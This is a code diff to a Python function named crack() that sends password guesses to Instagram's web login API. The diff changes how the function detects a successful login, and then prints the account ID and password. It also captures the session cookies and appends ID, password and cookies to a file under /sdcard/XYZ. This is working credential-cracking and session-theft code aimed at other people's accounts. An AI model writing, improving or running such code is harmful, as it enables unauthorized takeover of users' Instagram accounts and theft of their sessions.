@@ -175,18 +175,22 @@ def crack(uid, pww, total_idz):
             login_url = 'https://www.instagram.com/api/v1/web/accounts/login/ajax/'
             response = requests.post(login_url, cookies=cookies, headers=headers, data=data)
             if response.status_code == 200:
-                print("Request failed with status code:", response.status_code)
                 json_response = response.json()
-                if 'authenticated' in json_response and json_response['authenticated']:
+                if json_response.get('status') == 'ok':
+                   if json_response.get('authenticated') == True:
                         session_cookies = response.cookies.get_dict()
                         print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                         print(f"\r\033[1;92m [cookie] {session_cookies}")
                         open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
                         oks.append(uid)
-                        break
-                elif 'status' in json_response and json_response['status'] == 'fail':
-                    print(f"\r\033[1;91m [FAIL] {uid} | {pw}")
-                    break
+                        return True
+                   elif  json_response.get('auth_token'):
+                        session_cookies = response.cookies.get_dict()
+                        print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
+                        print(f"\r\033[1;92m [cookie] {session_cookies}")
+                        open("/sdcard/XYZ/RANDOM_OK.txt", "a").write(f"{uid}|{pw}|{session_cookies}\n")
+                        oks.append(uid)
+                        return True
             else:
                 print("Request failed with status code:", response.status_code)
                 continue
